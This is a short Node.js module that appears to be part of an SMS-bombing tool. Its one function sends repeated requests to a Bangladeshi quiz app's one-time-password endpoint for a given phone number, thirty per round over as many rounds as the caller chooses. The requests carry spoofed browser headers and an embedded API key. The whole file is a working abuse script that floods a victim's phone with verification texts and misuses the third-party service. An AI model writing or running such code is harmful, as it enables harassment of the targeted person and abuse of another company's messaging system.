const axios = require("axios");

async function giri(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const num = number.slice(1);
        const response = await axios.post(
  'https://developer.quizgiri.xyz/api/v2.0/send-otp',
  {
    'phone': num,
    'country_code': '+880',
    'fcm_token': null
  },
  {
    headers: {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'Content-type': 'application/json; charset=utf-8',
      'Origin': 'https://app.quizgiri.com.bd',
      'Referer': 'https://app.quizgiri.com.bd/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'x-api-key': 'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G'
    }
  }
);
        
        console.log(`[${i + 1}/10] giri Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] giri Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 60000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { giri };
